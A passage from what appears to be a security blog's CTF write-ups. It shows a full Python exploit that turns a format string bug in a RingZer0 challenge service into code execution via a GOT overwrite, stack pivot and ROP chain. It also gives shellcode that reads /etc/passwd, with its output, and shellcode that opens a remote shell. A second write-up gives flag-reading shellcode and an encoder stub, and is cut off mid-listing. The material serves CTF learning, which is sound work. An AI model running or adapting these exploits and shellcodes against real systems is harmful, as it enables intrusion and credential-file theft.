<p>What it does, is print 66 dummy bytes (0x42 == &lsquo;B&rsquo;) and then writes out the number of bytes written so far (<code>%hhn</code>) to a location that is pointed to by parameter 636. Then, it prints 255 dummy bytes, to make the write counter overflow. Writing out the next byte with <code>%hhn</code> will output 66+255 % 256 = 61, &lsquo;A&rsquo;). The next byte is written in the same way. This allows three bytes to be written at once, and will allow overwriting the GOT entry of strlen with the address of system!</p>

<pre><code class="bash">$ python sploit7.py 
parameter 5 points to:  0x7fff3ca480d8
address pointed to by parameter 5 contains:  0x7fff3ca49f01
scratch contains:  0x601b
scratch is parameter 1601
[+] strlen is at 0x7f82b7326c40.
[+] libc_base is at 0x7f82b72a60d0.
[+] wrote 0x601e20 to 1601
[+] wrote 0x601e21 to 1602
[+] wrote 0x601e22 to 1603

0x534142
</code></pre>

<p>OK, so that worked! I plugged in the values for system, the GOT entry for strlen and crossed my fingers. I tried to spawn a shell, but alas, no output. The binary had crashed though, and I tried again, this time trying for outbound access to my vps with <code>wget</code>. However, I never saw a HTTP connection and the remote binary seemed to hang. The service did not come back up. Uh-oh.</p>

<h2>Reaching out</h2>

<p>I apologized to <a href="https://twitter.com/MrUn1k0d3r">Mr.Un1k0d3r</a> via Twitter and he seemed interested in my poc. He even offered me to send the binary so I could play with it locally; I jumped at this chance of course, and requested the libc as well. Furthermore, he informed me that the box was heavily firewalled for security reasons (it being part of a CTF and all) and that my shell would not be accessible at all&hellip;</p>

<p>&hellip;Challenge accepted! :)</p>

<p>So it&rsquo;s back to the drawing board. The <code>system()</code> trick would not work, as the binary was not being ran using <code>socat</code>. It handled all the connections itself. Spawning a shell would not connect stdin, stdout and stderr to the socket that the binary was using, effectively stopping me from interacting with the shell.</p>

<p>Instead, I figured I could achieve an interactive shell by first using a call to <code>dup2</code> to duplicate the socket file descriptor, to couple it to stdin and stdout. This was inspired by <a href="http://shell-storm.org/shellcode/files/shellcode-881.php">this shellcode</a>.</p>

<p>First things first, though, I needed a ROP chain to actually read in the shellcode and run it. The stack was not executable (NX took care of that), so I had find a way to call <code>mprotect</code> to mark a section <code>rwx</code> and then <code>read</code> in the shellcode.</p>

<p>I started working on the ROP chain before Mr. Un1k0d3r sent over the files. This was pretty hard, as I had to search for the gadgets in libc (the binary did not contain enough gadgets) by dumping it. I first uploaded my own libc to <a href="http://ropshell.com">ropshell</a>. Once I had found a gadget, I dumped from -0x100 to +0x100 relative to that address; this allowed me to find the gadgets I needed. Luckily, soon after, I obtained the libc and the binary from Mr.Un1k0d3r, which helped a lot. I ran it in a 64-bit Kali (based on Debian) and started building and debugging my ROP exploit. But hold on a second!</p>

<h2>Pivot the Stack</h2>

<p>This wasn&rsquo;t a buffer overflow where I had full control over the stack! The ROP chain was somewhere in <code>buf</code> and I needed to make <code>rsp</code> point to it. Only then, the ROP chain would kick off properly. I had to find a single gadget that did this in one go. I roughly knew the location of <code>buf</code> relative to <code>rsp</code> (approximately at <code>rsp+0xd8</code>, which I reverse-engineered from the disassembly of the dumped binary). Why <code>buf</code>? <code>buf</code> <strong>can</strong> contain null bytes, whereas <code>cleanBuffer</code> cannot:</p>

<pre><code class="c">strncpy(cleanBuffer, buf, strlen(buf) - 1);
</code></pre>

<p>The strncpy takes care of that; any null byte it encounters will make it stop copying. Because we&rsquo;re on 64-bit, the gadget addresses will for sure contain null bytes. Instead, have a look at where <code>strlen</code> is used:</p>

<pre><code class="c">cleanBuffer = (char*)malloc(strlen(buf));
// dissambled:
lea rax, [rbp-0x11f0]
mov rdi, rax        // rax and rdi now point to buf
call dword 0x400b00 // strlen
</code></pre>

<p>This meant that I had multiple options to pivot <code>rsp</code> to <code>buf</code>, for instance with a <code>xchg rax, rsp</code> gadget. Upon finding no suitables ones, I had to go with stack lifting. I uploaded the libc which I got from Mr. Un1k0d3r to ropshell.com and starting looking for gadgets. What would I need?</p>

<pre><code>stack lifting
syscall
pop rax
pop rdi
pop rsi
pop rdx
</code></pre>

<p>See, I needed quite a few gadgets to be able to call <code>mprotect</code> and <code>read</code>. First, the stack lifting: I settled on <code>0x00082cfe: add rsp, 0x100; ret</code> in libc. I had no idea if I would have the correct amount added to <code>rsp</code>, but I solved that the lazy way by adding the ROP equivalent of a NOP-sled:</p>

<pre><code>0x041cf9: ret
</code></pre>

<p>This will keeping returning until the ROP chain hits the next correct gadget! I put everything together and tested it locally&hellip; but no dice! I debugged it in <code>gdb-peda</code> and the <code>mprotect</code> syscall seemed to work. The shellcode, however, was not being read in properly. The socket file descriptor was the problem. It was not a predictable value, so I could not hardcode it. I found that the socket was stored on the stack, but I could not leak it via the format string vulnerability. It was located at <code>rbp-0x48</code>, so I had to adjust my ROP chain to grab this value and use it in the <code>read</code> syscall. I had to build another ROP chain to get at it&hellip;</p>

<h2>Grabbing the socket descriptor value</h2>

<p>I started looking for gadgets that allowed me to dereference <code>rbp</code>. I ended up with these ones:</p>

<pre><code>0x0002028a : pop r15; ret
0x0006933f : lea rax, [rbp + r15]; pop rbp; pop r12; pop r13; pop r14; pop r15; ret
0x000eb938 : mov rax, [rax]; ret
0x0002c10e : xchg eax, edi; ret
</code></pre>

<p>The process is simple. The first <code>pop r15</code> will pop <code>-0x48</code> from the stack. Then, the address <code>rbp+r15</code> (effectively pointing to <code>rbp-0x48</code>) is loaded into <code>rax</code>. The value at this address is taken into <code>rax</code> in the third gadget. Finally, the value is stored in <code>edi</code>, ready for use in the <code>read</code> syscall. Here, I assume that the socket descriptor is less than 32 bits, which I think is reasonable. The <code>read</code> part of the ROP chain will read in the shellcode that we send and return to it.</p>

<p>I started with a modified read /etc/passwd shellcode, the <a href="http://shell-storm.org/shellcode/files/shellcode-878.php">original</a> of which was made by Mr.Un1k0d3r :)</p>

<h2>Putting it all together</h2>

<p>So from a high level, I use the format string vulnerability to write out the addresses of the first three bytes of the GOT entry of <code>strlen</code> to the stack. Then, using those addresses, the first three bytes of strlen&rsquo;s GOT entry are overwritten. The GOT entry of strlen then points to the stack lifting gadget. Upon connecting again, I send the ROP chain, the stack lifting gadget will be called instead of strlen, setting <code>rsp</code> to <code>buf</code>. The ROP chain kicks off and will grab the socket descriptor value, call <code>mprotect</code> and <code>read</code> in a shellcode. The shellcode will also use the socket descriptor and write the contents of <code>/etc/passwd</code> to the socket. All I have to do now is to sit back :)</p>

<p>Without further ado:</p>

<pre><code class="python">import struct, time
from socket import *

def p(x):
    return struct.pack('L', x &amp; 0xffffffffffffffff)

def grab_value_directly(i):
    s = socket(AF_INET, SOCK_STREAM)
    s.connect(('pwn01.ringzer0team.com', 13377))

    s.recv(128)
    s.send('%'+str(i)+'$lx\n')

    data = s.recv(64)
    addr = int(data.split()[0], 16)

    s.close()
    return addr

def grab_value_indirectly(i):
    s = socket(AF_INET, SOCK_STREAM)
    s.connect(('pwn01.ringzer0team.com', 13377))

    s.recv(128)
    s.send('%'+str(i)+'$s\n')

    data = s.recv(64)
    addr = data.split()[0]

    # ugly workaround, only grab 8 bytes. will fix this later!
    if len(addr) &gt; 8:
        address = addr[0:8]
    else:
        address = addr + '\x00' * (8-len(addr))

    s.close()
    return struct.unpack('L', address)[0]

def write_byte_value_via(i, value):
    s = socket(AF_INET, SOCK_STREAM)
    s.connect(('pwn01.ringzer0team.com', 13377))

    s.recv(128)
    s.send('%'+str(value)+'c%'+str(i)+'$hhn\n')
    data = s.recv(64)

    s.close()

def read_from_address(addr, offset):
    for i in range(4):
        b = (addr &amp; 0xff)
        addr &gt;&gt;= 8
        if b == 0:
            b = 256
        if i == 0:
            i = 256
        write_byte_value_via(5, i)      # change address
        write_byte_value_via(636, b)        # write byte

    dump1 = grab_value_indirectly(636+offset)
    return dump1

# write a value to a string format parameter
def write_on_stack(what, where, offset):
    # write out all the bytes of what
    for i in range(8):
        b = (what &amp; 0xff)
        what &gt;&gt;= 8
        if b == 0:
            b = 256
        if (i+where) == 0:
            i = 256
        write_byte_value_via(5, i+where)
        write_byte_value_via(636, b)
    print "[+] wrote {} to {}".format(hex(grab_value_directly(636+offset+where/8)), 636+offset+where/8)

parameter_636_addr = grab_value_directly(5)
print "parameter 5 points to: ", hex(parameter_636_addr)
value_at_636 = grab_value_indirectly(5)
print "address pointed to by parameter 5 contains: ", hex(value_at_636)

value_at_scratch = grab_value_indirectly(636)
print "scratch contains: ", hex(value_at_scratch)

format_offset = ((value_at_636 &amp; 0xffffffffffffff00) - parameter_636_addr)/8
print "scratch is parameter {}".format(636+format_offset)

# grab strlen from the GOT entry
strlen_addr = read_from_address(0x601b00, format_offset)

print "[+] strlen is at {}.".format(hex(strlen_addr))
libc_base = strlen_addr - 0x80c40
print "[+] libc_base is at {}.".format(hex(libc_base))

STACK_PIVOT = libc_base + 0x082cfe      # add rsp, 0x100; ret
print "[+] stack pivot gadget is at {}.".format(hex(STACK_PIVOT))

# we need to have three addresses on the stack which we can directly address
# to use them in the format string vuln 
# strlen
write_on_stack(0x601b00, 0, format_offset)
write_on_stack(0x601b01, 8, format_offset)
write_on_stack(0x601b02, 16, format_offset)

# need to write out the last three bytes of the STACK_PIVOT gadget over strlen's bytes
writebytes = STACK_PIVOT &amp; 0xffffff 

payload = ''
lastbyte = 0

# build format string to set three bytes at once
for i in range(3):
    if lastbyte &lt;= (writebytes &amp; 0xff):
        byte_to_write = (writebytes &amp; 0xff) - lastbyte
    else:   
        byte_to_write = 256 + (writebytes &amp; 0xff) - lastbyte

    payload += "%{}c".format(byte_to_write)
    lastbyte = writebytes &amp; 0xff

    writebytes &gt;&gt;= 8
    payload += "%{}$hhn".format(format_offset+636+i)

payload += "\n"

print "[+] writing {} to strlen's GOT entry".format(hex(STACK_PIVOT &amp; 0xffffff))

print "[+] format string payload: {}".format(payload)

# connect and send the format string
s = socket(AF_INET, SOCK_STREAM)
s.connect(('pwn01.ringzer0team.com', 13377))
s.recv(128)
s.send(payload)
s.recv(64)
s.close()


# now, strlen's GOT entry will point to the stack lifting gadget

# let's prepare the ROP chain
# here are the gadgets
SYSCALL = libc_base + 0x0ad215
POP_RAX = libc_base + 0x041dc8
POP_RSI = libc_base + 0x021535
POP_RDI = libc_base + 0x02028b
POP_RDX = libc_base + 0x0a834b

ropchain = ''
# mprotect 0x400000 to rwx, so we can write AND execute from it
ropchain += p(POP_RAX+1) * 8       # points to ret; effectively, a NOP!
ropchain += p(POP_RAX)
ropchain += p(10)                  # syscall mprotect
ropchain += p(POP_RDI)
ropchain += p(0x400000)            # start of buffer to mprotect
ropchain += p(POP_RSI)
ropchain += p(0x1000)              # length of buffer
ropchain += p(POP_RDX)
ropchain += p(7)                   # flags; rwx
ropchain += p(SYSCALL)             # after executing this syscall, 0x400000 should be rwx

# we need to fetch the socket from memory
ropchain += p(libc_base + 0x2028a) # pop r15; ret
ropchain += p(-0x48)               #
ropchain += p(libc_base + 0x6933f) # lea rax, [rbp + r15]; set rax to address that contains socket descriptor
ropchain += p(31337)*5             # junk for all the pop r64's
ropchain += p(libc_base + 0xeb938) # mov rax, [rax]; grabs value of socket descriptor
ropchain += p(libc_base + 0x2c10e) # xchg eax, edi; edi now contains the socket descriptor

# read in the shellcode from the socket (sockfd in rdi already)
ropchain += p(POP_RAX)
ropchain += p(0)                   # syscall read
ropchain += p(POP_RSI)
ropchain += p(0x400000)            # start of buffer
ropchain += p(POP_RDX)
ropchain += p(0x1000)              # size of buffer
ropchain += p(SYSCALL)             # after this syscall, the shellcode should be at 0x400000
ropchain += p(0x400000)            # so return to it!

# rdi still contains socket fd!
s = socket(AF_INET, SOCK_STREAM)
s.connect(('pwn01.ringzer0team.com', 13377))

print s.recv(128)
# send our ropchain
s.send(ropchain)

time.sleep(0.1)
# modified read /etc/passwd, original by Mr.Un1k0d3r
s.send("\x49\x87\xff\xeb\x3e\x5f\x80\x77\x0b\x41\x48\x31\xc0\x04\x02\x48\x31\xf6\x0f\x05\x66\x81\xec\xff\x0f\x48\x8d\x34\x24\x48\x89\xc7\x48\x31\xd2\x66\xba\xff\x0f\x48\x31\xc0\x0f\x05\x90\x90\x90\x49\x87\xff\x48\x89\xc2\x48\x31\xc0\x04\x01\x0f\x05\x48\x31\xc0\x04\x3c\x0f\x05\xe8\xbd\xff\xff\xff\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64\x41")

# handle the incoming connection; in this case, grab the contents of /etc/passwd
import telnetlib
t = telnetlib.Telnet()
t.sock = s
t.interact()
</code></pre>

<p>And the output!</p>

<pre><code class="bash">parameter 5 points to:  0x7fffb6657fc8
address pointed to by parameter 5 contains:  0x7fffb6658f51
scratch contains:  0x72632f656d6f682f
scratch is parameter 1123
[+] strlen is at 0x7f7af6e72c40.
[+] libc_base is at 0x7f7af6df2000.
[+] stack pivot gadget is at 0x7f7af6e74cfe.
[+] wrote 0x601b00 to 1123
[+] wrote 0x601b01 to 1124
[+] wrote 0x601b02 to 1125
[+] writing 0xe74cfe to strlen's GOT entry
[+] format string payload: %254c%1123$hhn%78c%1124$hhn%155c%1125$hhn

HF Remote Secure Shell [1.3.37]

Password:
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/bin/sh
man:x:6:12:man:/var/cache/man:/bin/sh
lp:x:7:7:lp:/var/spool/lpd:/bin/sh
mail:x:8:8:mail:/var/mail:/bin/sh
news:x:9:9:news:/var/spool/news:/bin/sh
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
proxy:x:13:13:proxy:/bin:/bin/sh
www-data:x:33:33:www-data:/var/www:/bin/sh
backup:x:34:34:backup:/var/backups:/bin/sh
list:x:38:38:Mailing List Manager:/var/list:/bin/sh
irc:x:39:39:ircd:/var/run/ircd:/bin/sh
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
libuuid:x:100:101::/var/lib/libuuid:/bin/sh
Debian-exim:x:101:103::/var/spool/exim4:/bin/false
statd:x:102:65534::/var/lib/nfs:/bin/false
sshuser:x:1000:1000:sshuser,,,:/home/sshuser:/bin/bash
mysql:x:103:106:MySQL Server,,,:/nonexistent:/bin/false
sshd:x:104:65534::/var/run/sshd:/usr/sbin/nologin
crackme:x:1001:1001::/home/crackme:/bin/sh
*** Connection closed by remote host ***
</code></pre>

<p>Cool, we have arbitrary code execution on the remote box! But remember, the goal was to get a shell&hellip;</p>

<h2>Shell&rsquo;s up</h2>

<p>The actual shellcode that landed me a shell uses <code>dup2</code> to duplicate stdin from the socket. This will allow us to communicate with the spawned shell. The assembly is quite straightforward. Not optimized, not pretty:</p>

<pre><code>bits 64

push rdi
push rdi
push 33         ; dup2
pop rax         ; set rax to dup2
                ; rdi still contains the socket fd
xor esi, esi    ; stdin
syscall
pop rdi
inc rsi         ; stdout
syscall
pop rdi
inc rsi         ; stderr
syscall

jmp _there
_here:
pop rdi         ; points to /bin/sh
xor esi, esi    ; argv = NULL
xor edx, edx    ; argp = NULL
push 59         ; execve
pop rax
syscall

push 60         ; exit
pop rax
syscall

_there:
call _here
db "/bin/sh", 0
</code></pre>

<p>After sticking that shellcode in the exploit, I got a shell!</p>

<pre><code class="python">s.send("\x57\x57\x6a\x21\x58\x31\xf6\x0f\x05\x5f\x48\xff\xc6\x0f\x05\x5f\x48\xff\xc6\x0f\x05\xeb\x0f\x5f\x31\xf6\x31\xd2\x6a\x3b\x58\x0f\x05\x6a\x3c\x58\x0f\x05\xe8\xec\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x00")
</code></pre>

<p><img src="/assets/maximum-overkill-two/01-interactive-shell-on-remote-box.png" alt="" /></p>

<p>You can see that the <code>dup2</code> shellcode is not completely effective; I needed to redirect stdout to stdin to get command output so somehow <code>dup2</code> does not duplicate stdout correctly. But hey, the objective is met! An interactive shell on an otherwise inaccessible server!</p>

<h2>Wrapping up</h2>

<p>This was a story of how a single format string vulnerability was beaten into arbitrary code execution. The exploit bypasses ASLR and NX via ROP, and finally sends over shellcode which will be executed. The CTF challenge was not designed with this in mind, but it was a fun exercise (and a potential warmup for Boston Key Party) nonetheless! My thanks go out to Mr.Un1k0d3r for being cool with me trying to break his challenge and even giving me the binary :)</p>

<p>Until the next #maximumoverkill :]</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Solving the X86-64 Shellcoding Challenges of RingZer0CTF]]></title>
    <link href="http://barrebas.github.io/blog/2015/02/09/solving-the-x86-64-shellcoding-challenges-of-ringzer0ctf/"/>
    <updated>2015-02-09T21:49:17+01:00</updated>
    <id>http://barrebas.github.io/blog/2015/02/09/solving-the-x86-64-shellcoding-challenges-of-ringzer0ctf</id>
    <content type="html"><![CDATA[<p><a href="http://ringzer0team.com">RingZer0Team</a> is hosting a long-term CTF. The shellcoding challenges presented a very nice set of challenges. It was really fun <strong>and</strong> I learned a ton about 64-bit shellcoding while solving them!</p>

<!-- more -->


<p>I have redacted all the flags, because that would spoil things a bit too much. I did, however, try to verify all the shellcodes that are presented here. Sometimes, filenames may not match or errors may have creeped into the scripts during clean-up. For this, my apologies ;)</p>

<h2>Level 1</h2>

<p>Let&rsquo;s start easy. Upon connecting via <code>ssh</code>, the challenge presents us with the following:</p>

<pre><code>$ ssh level1@shellcode.ringzer0team.com -p 7771
level1@shellcode.ringzer0team.com's password: 
Linux ld64deb1 3.2.0-4-amd64 #1 SMP Debian 3.2.54-2 x86_64
Last login: Sun Feb  1 19:36:20 2015 from 93.74.28.37

RingZer0 Team CTF Shellcoding Level 1
Submit your shellcode using hex representation "\xcc\xcd".
Type "end" to exit.

This level have no shellcode restriction.
You main goal is to read /flag/level1.flag

shellcode&gt;
</code></pre>

<p>Although it says <em>no restriction</em>, there is one crucial restriction: NULL bytes are <strong>not</strong> allowed. This probably means that the shellcode is being copied to a buffer by <code>strcpy</code> or something similar. I found this out the hard way&hellip; Anyway, after realizing my mistake, I rebuilt my shellcode from the ground up, avoiding all NULL bytes. The shellcode is quite simple: it builds the filename on the stack, then opens that file, reads the contents onto the stack and finally writes off the contents to stdout. A very helpful link is this <a href="http://blog.rchapman.org/post/36801038863/linux-system-call-table-for-x86-64">x64 syscall table</a> which lists all the syscalls and the arguments.</p>

<p>To avoid NULL bytes, registers can be zeroed by using <code>xor</code>. To set a byte-sized value, the value can be <code>push</code>ed and then <code>pop</code>ped into a register. Often, registers still hold their original value after a syscall and thus can be re-used.</p>

<pre><code>bits 64

_start:

mov dword [rsp], '/fla'     ; build filename on stack
mov dword [rsp+4], 'g/le'
mov dword [rsp+8], 'vel1'
mov dword [rsp+12], '.fla'
push 'g'
pop rcx
mov [rsp+16], ecx

lea rdi, [rsp]              ; rdi now points to filename '/flag/level1.flag'
xor rsi, rsi                ; rsi contains O_RDONLY, the mode with which we'll open the file
xor rax, rax
inc rax
inc rax                     ; syscall open = 2
syscall 

mov rbx, rax                ; filehandle of opened file

lea rsi, [rsp]              ; rsi is the buffer to which we'll read the file
mov rdi, rbx                ; rbx was the filehandle
push byte 0x7f              ; read 127 bytes. if we stay below this value, the generated opcode will not contain null bytes
pop rdx
xor rax, rax                ; syscall read = 0
syscall

lea rsi, [rsp]              ; the contents of the file were on the stack
xor rdi, rdi
inc rdi                     ; filehandle; stdout!
mov rdx, rax                ; rax was amount of bytes read by syscall read
xor rax, rax
inc rax
syscall                     ; syscall write = 1

push byte 60                ; some bytes left...
pop rax                     ; exit cleanly
syscall
</code></pre>

<p>To assemble and generate the shellcode in the format which the challenge wants, I used this command:</p>

<pre><code class="bash">$ echo; nasm -f bin ./level1-nonulls.asm; xxd -c 1 ./level1-nonulls | awk '{print "\\x"$2 }' |tr -d '\n'; echo; wc -c ./level1-nonulls

\xc7\x04\x24\x2f\x66\x6c\x61\xc7\x44\x24\x04\x67\x2f\x6c\x65\xc7\x44\x24\x08\x76\x65\x6c\x31\xc7\x44\x24\x0c\x2e\x66\x6c\x61\x6a\x67\x59\x89\x4c\x24\x10\x48\x8d\x3c\x24\x48\x31\xf6\x48\x31\xc0\x48\xff\xc0\x48\xff\xc0\x0f\x05\x48\x89\xc3\x48\x8d\x34\x24\x48\x89\xdf\x6a\x7f\x5a\x48\x31\xc0\x0f\x05\x48\x8d\x34\x24\x48\x31\xff\x48\xff\xc7\x48\x89\xc2\x48\x31\xc0\x48\xff\xc0\x0f\x05\x6a\x3c\x58\x0f\x05
100 ./level1-nonulls
</code></pre>

<p>It spits out the shellcode, ready for copy &amp; paste, along with the size of the shellcode. Running it versus the server yields the flag!</p>

<h2>Level 2</h2>

<p>The password for level 2 is the flag of level 1. It seems the ante has been upped:</p>

<pre><code>RingZer0 Team CTF Shellcoding Level 2
Submit your shellcode using hex representation "\xcc\xcd".
Type "end" to exit.

This level have shellcode restriction. Bad char list "\x0a\x0d\x2f\x2e\x62\x99" max size 50 bytes.
You main goal is to read /flag/level2.flag
</code></pre>

<p>So the previous shellcode goes right out the window. I needed to cut it in half, length-wise. Also, not all characters are allowed, so-called <em>bad chars</em>. This will restrict the instructions we can use in the shellcode. Let&rsquo;s have a look at how we can trim the fat off of the shellcode of level 1.</p>

<p>First, hard-coding the filename is out of the question. That would waste at least 18 bytes, or 36% of the shellcode. Furthermore, it would contain the bad char <code>0x2f</code> which is the slash <code>/</code>. Instead, I decided to read in the name of the file with a syscall; the rest of the shellcode then takes care of opening that file, reading from it and sending the bytes back to us.</p>

<pre><code>bits 64

_start:
xor rax, rax        ; syscall read = 0
xor rdi, rdi        ; we'll read from stdin
mov rsi, rsp        ; one byte shorter than 'lea rsi, [rsi]'
push byte 18        ; number of bytes to read, enough for the filename
pop rdx
syscall 

xor rax, rax
inc rax
inc rax             ; syscall open
                    ; instead of setting rdi to the filename (located on the stack),
                    ; we re-use the fact that rdi is zero and rsi points to that filename
xchg rsi, rdi       ; now rsi = 0 (O_RDONLY), and rdi points to the filename we just read
syscall

xchg rax, rsi       ; after this, rsi contains the filehandle of the opened file, rax contains 0
xchg rdi, rsi       ; after this, rdi contains the filehandle and rsi points to the stack (a buffer!)
push byte 127
pop rdx             ; read 127 bytes, should be plenty
syscall             ; because we set rax to 0, this will call syscall read

xor rax, rax
inc rax             ; syscall write
mov rdi, rax        ; copy the value of rax to rdi (1 = stdout)
                    ; rsi = still pointer to buffer
                    ; rdx = still 0x7f
syscall             ; grab the flag!
</code></pre>

<p>Assembling the shellcode is done with the previous command. No bad chars made it into the shellcode, and we have one byte to spare!</p>

<pre><code>$ echo; nasm -f bin ./level2-shellcode.asm; xxd -c 1 ./level2-shellcode | awk '{print "\\x"$2 }' |tr -d '\n'; echo; wc -c ./level2-shellcode

\x48\x31\xc0\x48\x31\xff\x48\x89\xe6\x6a\x12\x5a\x0f\x05\x48\x31\xc0\x48\xff\xc0\x48\xff\xc0\x48\x87\xf7\x0f\x05\x48\x96\x48\x87\xfe\x6a\x7f\x5a\x0f\x05\x48\x31\xc0\x48\xff\xc0\x48\x89\xc7\x0f\x05
49 ./level2-shellcode
</code></pre>

<p>Running it on the server:</p>

<pre><code class="bash">shellcode&gt;\x48\x31\xc0\x48\x31\xff\x48\x89\xe6\x6a\x12\x5a\x0f\x05\x48\x31\xc0\x48\xff\xc0\x48\xff\xc0\x48\x87\xf7\x0f\x05\x48\x96\x48\x87\xfe\x6a\x7f\x5a\x0f\x05\x48\x31\xc0\x48\xff\xc0\x48\x89\xc7\x0f\x05
    Shellcode received...
    Shellcode length (49) bytes.

    Success: Executing shellcode...

/flag/level2.flag^@
FLAG-&lt;redacted&gt;
    Error: SIGSEGV received I think your shellcode is not working
</code></pre>

<p>After succesfully executing the shellcode, it demands input on stdin. Specifically, it needs the filename which we want to read. Notice that the filename is terminated with a NULL byte: this can be done by typing in the correct filename and then pressing <code>Ctrl+Space</code> to send a NULL byte. When done, pressing enter will yield the flag!</p>

<h2>Level 3</h2>

<pre><code class="bash">This level have shellcode restriction. Bad char list "\x0a\x0d\x2f\x2e\x62\x48\x98\x99\x30\x31" max size 50 bytes.
You main goal is to read /flag/level3.flag
</code></pre>

<p>Again, fifty bytes maximum shellcode length, but more bad chars have been added. Unfortunately, the bad chars <code>0x48</code> and <code>0x31</code> make the use of <code>xor rax, rax</code> and the like impossible! Instead, to zero a register, something like this can be done:</p>

<pre><code>push byte 1     ; 0x6a, 0x01
pop rbx         ; 0x5b
dec bl          ; 0xff
</code></pre>

<p>This effectively clears <code>rbx</code>. This register also typically keeps it&rsquo;s original value after a syscall (it&rsquo;s non-volatile), so it&rsquo;s a good place to store something we&rsquo;ll use more often.</p>

<p>Furthermore, I like to use <code>xchg</code> to swap around contents of registers. However, if this is done on full 64-bit registers, the assembler generates a <code>0x48</code> byte, which is a bad char. Instead, the values can be passed around via the stack:</p>

<pre><code>; instruction   ; opcode
; --------------|-------
push rax        ; 0x50
push rbx        ; 0x53
pop rax         ; 0x58
pop rbx         ; 0x5b
</code></pre>

<p>The effect of this is that <code>rax</code> now contains the value of <code>rbx</code> and vice-versa. Without further ado, the shellcode for level 3:</p>

<pre><code>bits 64

_start:

push byte 1
pop rbx
dec bl              ; rbx is now zeroed out, avoiding the bad chars 0x31 and 0x48. 

push rbx
pop rax             ; rax is now zeroed out too. 

push rbx
pop rdi             ; stdin is zero, so zero out rdi as well

push rsp            ; make rsi point to the top of the stack
pop rsi             ; the buffer for syscall read

push byte 18        ; read in 18 bytes
pop rdx
syscall

push rbx
pop rax
inc al
inc al              ; syscall open

;xchg rsi, rdi      ; we cannot use this xchg opcode because of 0x48!
push rdi            ; instead, do the exchange of rsi and rdi via the stack
push rsi
pop rdi             ; rdi is now pointing to the filename on the stack
pop rsi             ; rsi is now zero (flag O_RDONLY)

syscall
                    ; pull a similar trick here, swapping around three registers
push rax            ; fd of just opened file
push rsi            ; rsi = 0
push rdi            ; rdi = pointer to top of stack
pop rsi             ; rsi = buf
pop rax             ; rax = 0 syscall read
pop rdi             ; rdi = fd

push byte 127
pop rdx             ; amount of bytes to read
syscall             ; syscall read

push rbx
pop rax
inc al              ; syscall write
push rax            ; copy rax (==1) to rdi
pop rdi             ; 1 = stdout
                    ; rsi = still pointing to buffer with contents of file
                    ; rdx = still 0x7f
syscall
</code></pre>

<p>Assembling it:</p>

<pre><code class="bash">$ echo; nasm -f bin ./shellcode3.asm; xxd -c 1 ./shellcode3 | awk '{print "\\x"$2 }' |tr -d '\n'; echo; wc -c ./shellcode3

\x6a\x01\x5b\xfe\xcb\x53\x58\x53\x5f\x54\x5e\x6a\x12\x5a\x0f\x05\x53\x58\xfe\xc0\xfe\xc0\x57\x56\x5f\x5e\x0f\x05\x50\x56\x57\x5e\x58\x5f\x6a\x7f\x5a\x0f\x05\x53\x58\xfe\xc0\x50\x5f\x0f\x05
47 ./shellcode3
</code></pre>

<p>Haha! No bad chars <em>and</em> three bytes to spare!</p>

<h2>Level 4</h2>

<p>I wasn&rsquo;t laughing anymore once I saw the restrictions placed on the shellcode of level 4:</p>

<pre><code>This level have shellcode restriction. Bad char list "\x0a\x0d\x2f\xff\x0f\x05\x48" max size 80 bytes.
</code></pre>

<p>This bans the use of <code>syscall</code>, which assembles to <code>0x0f, 0x05</code>. In theory, I think <code>int 0x80</code> (<code>cd 80</code>) could be used, but I haven&rsquo;t verified. The shellcode needs to be obfuscated and decoded at runtime somehow. I decided to make a very simple encoding &amp; decoding system: the bytes are simply increased by one. At runtime, a small stub of code is responsible for decrementing each byte to it&rsquo;s proper value.</p>

<p>I&rsquo;ve made use of a cool trick available on the 64-bit architecture: RIP-relative addressing. Normally, to get the address at which something is running, we&rsquo;d do this:</p>

<pre><code>jmp _over_the_shellcode         ; jmp short, assembles to 0xeb + 8 bit signed displacement

_getInstructionPointer:
pop rbx                         ; rbx now contains the address of _location

; ...shellcode bytes...

_over_the_shellcode:
call _getInstructionPointer     ; call backward, assembles to 0xe8 and a 32 bit signed displacement

_location:
</code></pre>

<p>However, this <code>jmp/call/pop</code> sequence to get the current location of code would introduce <code>0xff</code> bytes due to the relative call backwards. We can&rsquo;t use this, but luckily RIP-relative addressing comes to the rescue!</p>

<pre><code>lea rax, [rel _shellcode]    ; notice the use of the rel keyword!

_shellcode:
</code></pre>

<p>Again, however, due to the nature of this instruction (it uses a 32-bit displacement value) this would introduce NULL bytes. Instead, I decided to offset the value with a constant and then subtracting that constant. Finally, I needed to select a proper register. I settled on <code>r14</code>, because <code>rax</code> through <code>rdi</code> would introduce bad chars, and so would <code>r15</code>.</p>

<p>The decoder looks like this:</p>

<pre><code>bits 64


default rel                         ; we'll use relative addressing to get RIP

_start:
                                    ; we use r14, because this will avoid the 0x48 byte
                                    ; lea eax/ecx etc emits 0x48
lea r14, [rel _shellcode+0x12345678]; we can't use it directly, because of null bytes.
sub r14, 0x12345678                 ; restore the value in r14, so it points to the encoded shellcode.

push byte 43                        ; put amount of bytes to decode
pop rcx                             ; in rcx

_decode:
dec byte [r14]                      ; start at r14 (_fakecall)
add r14, 1                          ; 'decode' by adding 1
loop _decode                        ; decode `ecx` bytes.

_shellcode:                         ; place 'encoded' shellcode here
</code></pre>

<p>The actual shellcode is nearly the same one used above. It reads in the name of the file you want to read (terminate with <code>^@</code> or <code>0x00</code> by typing Ctrl+space). It then opens that file, reads from it, storing the data on the stack. It finally writes the contents of the file back to us.</p>

<pre><code>bits 64

_start:

push byte 0         ; we can use 0 here because we add 1 to each 
                    ; byte in the shellcode to 'encode' it.
pop rbx             ; store this value in rbx. We'll re-use it later.
push rbx            ; copy rbx...
pop rax             ; ...to rax. rax is now 0, the syscall for 'read'
push rbx            ; copy rbx...
pop rdi             ; ...to rdi: fd = stdin 
push rsp            ; copy rsp to rsi
